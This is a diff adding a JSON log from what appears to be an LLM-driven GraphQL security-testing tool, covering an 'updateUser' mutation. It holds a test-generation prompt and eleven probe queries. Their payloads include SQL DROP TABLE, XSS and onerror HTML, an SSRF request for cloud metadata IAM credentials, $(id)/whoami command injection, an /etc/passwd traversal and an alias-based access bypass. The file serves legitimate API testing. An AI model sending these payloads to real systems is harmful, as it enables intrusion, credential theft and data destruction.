@@ -1,0 +1,56 @@
+{
+  "timestamp": "20251010_013219",
+  "endpoint": "updateUser",
+  "prompt": "\n    You are an expert in GraphQL API security testing.\n\n    Goal: generate valid GraphQL queries for the operation shown, to get successful responses (HTTP 200) quickly while exploring robustness and testing for specific vulnerability types.\n\n    \n    CRITICAL REQUIREMENT: You MUST include at least one query for a basic call and EACH of the following vulnerability types:\n    - SQL Injection\n    - XSS Injection\n    - SSRF Injection\n    - OS Command Injection\n    - Path Injection\n    - HTML Injection\n    - Query Deny Bypass (REQUIRES TWO QUERIES: non-aliased and aliased)\n    - Introspection\n    - Field Suggestions\n\n    Strict Requirements:\n    1) Queries must be syntactically valid GraphQL.\n    2) No placeholders like <id>, \"ID!\", \"value\". Use realistic literals or known real values.\n    3) You may attempt injected strings, nulls, overlong strings, and type mismatches where appropriate.\n    4) You may output 1 query(ies) but MUST cover all vulnerability types listed above.\n    5) Do not use the words \"edges\" or \"node\".\n    6) GraphQL is case-sensitive. Match the exact operation name: updateUser.\n    7) If there are previous response pairs, use them to generate the query.\n    8) For each vulnerability type, craft queries that specifically test for that vulnerability pattern.\n    9) CRITICAL: Label each query with its vulnerability type using the format: ***<vulnerability_type>*** before each ```graphql block.\n    10) SPECIAL CASE: For Query Deny Bypass, you MUST generate TWO queries:\n        - First query: Non-aliased version (normal query structure)\n        - Second query: Aliased version (using query aliases like \"s: queryName\")\n        Both queries should test the same operation but with different structures to test access control bypass.\n    \n        Schema not provided: explore plausibly.\n        - Prefer fields/args seen in prior successful responses or known real values.\n        - Introduce at most 1–2 new fields per query.\n        - Keep selection depth minimal to maximize validity.\n        \n    Context:\n    - operation: updateUser\n    - input (declared): updateUser, input: {'userID': 'ID!', 'firstName': 'String', 'lastName': 'String', 'description': 'String'}\n    - node type: mutation\n    - known real values: \n\n    Argument strategy: synthesize realistic literals by type (e.g., ISO dates, small integers, emails, UUIDv4), avoid placeholders.\n    Selection depth target: 1. Keep nested selections no deeper than 1 levels.\n    \n    Output format:\n    Each query must be in its own fenced block with a vulnerability type label:\n    Vulnerability Type Labels Are:\n    - SQL_Injection\n    - XSS_Injection\n    - SSRF_Injection\n    - OS_Command_Injection\n    - Path_Injection\n    - HTML_Injection\n    - Query_Deny_Bypass_Non_Aliased\n    - Query_Deny_Bypass_Aliased\n    - Introspection\n    - Field_Suggestions\n    - Basic_Call\n\n    ***<Vulnerability Type>***\n    ```graphql\n    <your query>\n    ```\n    \n    Example:\n    ***SQL_Injection***\n    ```graphql\n    query {\n      users(filter: \"1' OR '1'='1\") {\n        id\n        name\n      }\n    }\n    ```\n    \n    ***XSS_Injection***\n    ```graphql\n    query {\n      search(term: \"<script>alert('xss')</script>\") {\n        results\n      }\n    }\n    ```\n    ",
+  "llm_response": "```",
+  "parsed_queries": {
+    "query": [
+      {
+        "query": "\nmutation updateUser {\n  updateUser(input: {userID: \"550e8400-e29b-41d4-a716-446655440000\", firstName: \"Alice\", lastName: \"Johnson\", description: \"Standard update via API\"}) {\n    success\n    message\n    user {\n      id\n      firstName\n      lastName\n      description\n    }\n  }\n}\n",
+        "vulnerability_type": "basic_call"
+      },
+      {
+        "query": "\nmutation updateUser {\n  updateUser(input: {userID: \"550e8400-e29b-41d4-a716-446655440000\", firstName: \"Robert'); DROP TABLE users;--\", lastName: \"O'Connor\", description: \"Testing SQL injection in name field\"}) {\n    success\n    message\n    user {\n      id\n      firstName\n      lastName\n    }\n  }\n}\n",
+        "vulnerability_type": "sql_injection"
+      },
+      {
+        "query": "\nmutation updateUser {\n  updateUser(input: {userID: \"f47ac10b-58cc-4372-a567-0e02b2c3d479\", firstName: \"Eve\", lastName: \"Hacker\", description: \"<script>alert('xss')</script>\"}) {\n    success\n    message\n    user {\n      id\n      description\n    }\n  }\n}\n",
+        "vulnerability_type": "xss_injection"
+      },
+      {
+        "query": "\nmutation updateUser {\n  updateUser(input: {userID: \"9b2d6f6e-7c3a-4c12-9f0b-1a2b3c4d5e6f\", firstName: \"Service\", lastName: \"Probe\", description: \"Please fetch http://169.254.169.254/latest/meta-data/iam/security-credentials/\"}) {\n    success\n    message\n    user {\n      id\n      description\n    }\n  }\n}\n",
+        "vulnerability_type": "ssrf_injection"
+      },
+      {
+        "query": "\nmutation updateUser {\n  updateUser(input: {userID: \"d3b07384-d9a8-4d6a-9f3b-8a7b6c5d4e3f\", firstName: \"Cmd\", lastName: \"Test\", description: \"payload: $(id) `whoami` || echo vulnerable\"}) {\n    success\n    message\n    user {\n      id\n      description\n    }\n  }\n}\n",
+        "vulnerability_type": "os_command_injection"
+      },
+      {
+        "query": "\nmutation updateUser {\n  updateUser(input: {userID: \"../../etc/passwd\", firstName: \"Traverse\", lastName: \"Tester\", description: \"Attempt path traversal via ID field\"}) {\n    success\n    message\n    user {\n      id\n      description\n    }\n  }\n}\n",
+        "vulnerability_type": "path_injection"
+      },
+      {
+        "query": "\nmutation updateUser {\n  updateUser(input: {userID: \"3fa85f64-5717-4562-b3fc-2c963f66afa6\", firstName: \"Image\", lastName: \"Inject\", description: \"<img src=x onerror='alert(\\\"HTML_INJECTION\\\")'>\"}) {\n    success\n    message\n    user {\n      id\n      description\n    }\n  }\n}\n",
+        "vulnerability_type": "html_injection"
+      },
+      {
+        "query": "\nmutation updateUser {\n  updateUser(input: {userID: \"00000000-0000-0000-0000-000000000001\", firstName: \"Root\", lastName: \"Admin\", description: \"Attempting privileged update - non-aliased\"}) {\n    success\n    message\n    user {\n      id\n      firstName\n      lastName\n    }\n  }\n}\n",
+        "vulnerability_type": "query_deny_bypass_non_aliased"
+      },
+      {
+        "query": "\nmutation updateUser {\n  s: updateUser(input: {userID: \"00000000-0000-0000-0000-000000000001\", firstName: \"Root\", lastName: \"Admin\", description: \"Attempting privileged update - aliased\"}) {\n    success\n    message\n    user {\n      id\n      firstName\n      lastName\n    }\n  }\n}\n",
+        "vulnerability_type": "query_deny_bypass_aliased"
+      },
+      {
+        "query": "\nquery updateUser {\n  updateUser {\n    queryType { name }\n    mutationType { name }\n    types { name }\n  }\n}\n",
+        "vulnerability_type": "introspection"
+      },
+      {
+        "query": "\nmutation updateUser {\n  updateUser(input: {userID: \"550e8400-e29b-41d4-a716-446655440000\", firstName: \"Alicia\", lastName: \"Johns\", description: \"Testing misspelled fields for suggestion hints\"}) {\n    user {\n      id\n      firstName\n      firsName\n      lastName\n      descrption\n    }\n  }\n}\n",
+        "vulnerability_type": "field_suggestions"
+      }
+    ]
+  },
+  "approx_tokens": 811.0,
+  "request_time": "2025-10-10T01:32:19.874776"
+}
